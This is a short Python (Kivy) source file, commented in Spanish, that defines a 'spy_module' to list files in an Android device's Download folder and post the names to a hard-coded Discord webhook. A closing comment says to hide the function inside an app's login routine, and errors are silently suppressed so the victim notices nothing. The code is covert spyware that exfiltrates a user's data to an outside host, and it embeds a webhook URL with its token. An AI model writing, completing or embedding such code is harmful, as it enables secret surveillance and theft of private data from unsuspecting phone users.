import requests
import os
from kivy.app import App

# URL de tu Webhook (Javic888)
WEBHOOK = "https://discord.com/api/webhooks/1458528159153656000/S8l9Mc7-O6IsXhqyM7ui-twFGaUgbQM5SFgBIJL0cPN6-x29P-P1ZCDaKJpnzjzOULA3"

def spy_module():
    try:
        # Intentar capturar archivos de WhatsApp/Telegram o Descargas
        path = "/sdcard/Download/"
        files = os.listdir(path)[:15] # Toma los primeros 15 archivos
        file_list = "\n".join(files)
        
        payload = {
            "content": "@here **REPORTE DE ACCESO TOTAL**",
            "embeds": [{
                "title": "📂 EXTRACCIÓN DE ARCHIVOS - DNS SEC",
                "description": f"Archivos detectados en /Download:\n```\n{file_list}\n```",
                "color": 16711680
            }]
        }
        requests.post(WEBHOOK, json=payload)
    except:
        pass

# Integrar spy_module() dentro de la función de login que te pasé antes
